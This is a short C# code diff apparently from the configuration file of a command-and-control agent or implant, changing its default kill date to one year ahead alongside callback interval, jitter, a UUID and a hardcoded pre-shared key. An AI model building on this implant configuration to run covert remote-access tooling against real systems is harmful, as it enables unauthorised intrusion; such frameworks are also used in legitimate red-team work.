@@ -51,7 +51,7 @@ namespace Agent.Config
             jitter = 1;
             uuid = "3e9a54ad-9eb6-4e0b-b9e2-efd7144a568f";
             psk = "T6HUQtaWAsLsZGha7yUpPTMjoi6R99fQ5Khf6pl6rCA=";
-            killDate = DateTime.MaxValue;
+            killDate = DateTime.Now.AddYears(1);
 #endif
             int _tempInt = 0;
             if(int.TryParse("callback_interval", out _tempInt)){
@@ -63,7 +63,7 @@ namespace Agent.Config
                 jitter = _tempInt;
             }
 
-            DateTime _killDate = DateTime.MinValue;
+            DateTime _killDate = DateTime.Now.AddYears(1);
             if(DateTime.TryParse("killdate", out _killDate))
             {
                 killDate = _killDate;
